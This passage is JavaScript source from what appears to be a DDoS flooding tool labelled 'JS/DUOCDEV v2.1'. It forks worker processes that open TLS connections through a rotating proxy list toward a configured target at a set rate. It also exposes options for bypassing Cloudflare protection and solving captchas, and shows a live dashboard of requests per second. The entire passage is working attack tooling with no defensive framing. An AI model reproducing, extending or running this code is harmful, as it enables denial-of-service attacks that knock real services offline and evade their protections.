      try { tlsSock.write(payload); workerMetrics?.addSent(payload.length); }
      catch (_) { alive = false; cleanup(); }
    });
  });
}

/* ============================================================
 *  CLUSTER
 * ============================================================ */
const isPrimary = cluster.isPrimary !== undefined ? cluster.isPrimary : cluster.isMaster;

if (isPrimary) {
  if (cfg.debug && cfg.dashboard === 0) {
    console.log(colors.cyan.bold(`\n  JS/DUOCDEV v2.1`));
    console.log(colors.dim(`  method=${cfg.method}  target=${cfg.target}  time=${cfg.time}s  threads=${cfg.threads}  rate=${cfg.rate}/s  http=${cfg.http}`));
    console.log(colors.dim(`  proxy=${cfg.proxyType}  file=${cfg.proxyFile}  cf-bypass=${cfg.bypassCF ? colors.green('on') : colors.red('off')}  solver=${cfg.captchaKey ? colors.green('on') : colors.red('off')}\n`));
  }

  for (let n = 0; n < cfg.threads; n++) cluster.fork({ CORE: n % os.cpus().length });

  cluster.on('exit', (worker, code, signal) => {
    if (code === 0 || signal === 'SIGTERM' || signal === 'SIGINT') return;
    cluster.fork({ CORE: worker.id % os.cpus().length });
  });

  const workerSnaps = new Map();
  cluster.on('message', (w, msg) => {
    if (msg?.type === 'metrics') workerSnaps.set(w.id, msg.data);
  });

  const startedAt = Date.now();
  const aggregate = () => {
    const all = {
      elapsed: Math.floor((Date.now() - startedAt) / 1000),
      sent: 0, success: 0, fail: 0, bytesOut: 0, bytesIn: 0,
      status: {}, timeline: new Array(30).fill(0),
    };
    let allLat = [];
    for (const s of workerSnaps.values()) {
      all.sent += s.sent || 0;
      all.success += s.success || 0;
      all.fail += s.fail || 0;
      all.bytesOut += s.bytesOut || 0;
      all.bytesIn += s.bytesIn || 0;
      for (const [k, v] of Object.entries(s.status || {})) all.status[k] = (all.status[k] || 0) + v;
      if (Array.isArray(s.timeline)) s.timeline.forEach((v, idx) => { if (idx < 30) all.timeline[idx] += v; });
      if (Array.isArray(s.latencies)) allLat.push(...s.latencies);
    }
    all.successRate = all.sent ? (all.success / all.sent) * 100 : 0;
    all.rps = all.sent / Math.max(1, all.elapsed);
    const recent = all.timeline.slice(-10);
    all.rpsRecent = recent.reduce((a, c) => a + c, 0) / 10;
    all.latencyAvg = allLat.length ? allLat.reduce((a, c) => a + c, 0) / allLat.length : 0;
    if (allLat.length) {
      const sorted = allLat.sort((a, c) => a - c);
      all.latencyP50 = sorted[Math.floor(sorted.length * 0.50)];
      all.latencyP95 = sorted[Math.floor(sorted.length * 0.95)];
      all.latencyP99 = sorted[Math.floor(sorted.length * 0.99)];
    } else {
      all.latencyP50 = all.latencyP95 = all.latencyP99 = 0;
    }
    return all;
  };

  if (cfg.dashboard > 0) {
    startDashboard(cfg.dashboard, aggregate);
  } else if (cfg.debug) {
    setInterval(() => {
      const s = aggregate();
      const status = Object.entries(s.status).map(([k, v]) => `${colors.bold(k)}:${v}`).join(' ');
      const remain = Math.max(0, cfg.time - s.elapsed);
      console.log(
        `[${colors.magenta('JS/DUOCDEV')}] ` +
        `t=${s.elapsed}/${cfg.time}s ` +
        `rps=${colors.cyan(s.rps.toFixed(1))} ` +
        `ok=${colors.green(s.success)} ` +
        `fail=${colors.red(s.fail)} ` +
        `sr=${s.successRate.toFixed(1)}% ` +
        `lat=${s.latencyAvg.toFixed(0)}ms ` +
        `p95=${s.latencyP95.toFixed(0)}ms ` +
        `[${status || colors.dim('—')}] ` +
        `remain=${remain}s`
      );
    }, 1000);
  }

  setTimeout(() => {
    for (const id in cluster.workers) { try { cluster.workers[id].kill('SIGTERM'); } catch (_) {} }
    setTimeout(() => process.exit(0), 500);
  }, cfg.time * 1000);

  process.on('SIGINT', () => process.exit(0));
} else {
  const maxConns = cfg.conns || Math.max(1, Math.ceil(PROXIES.length / Math.max(1, cfg.threads)));
  const used = new Set();
  let active = 0;

  const spawn = () => {
    if (active >= maxConns) return;
    let candidates = PROXIES.filter(p => !used.has(p));
    if (!candidates.length) { used.clear(); candidates = PROXIES; }
    const pick = candidates[rndInt(0, candidates.length - 1)];
    used.add(pick);
    active++;
    openConnection(pick)
      .catch(() => {})
      .finally(() => { active--; used.delete(pick); });
  };

  const spawnTimer = setInterval(spawn, Math.max(5, cfg.delay));
  spawnTimer.unref();

  workerMetrics = new Metrics();

  setInterval(() => {
    if (process.connected) {
      try { process.send({ type: 'metrics', data: workerMetrics.snapshot() }); } catch (_) {}
    }
  }, 500).unref();

  setTimeout(() => { clearInterval(spawnTimer); process.exit(0); }, cfg.time * 1000);
}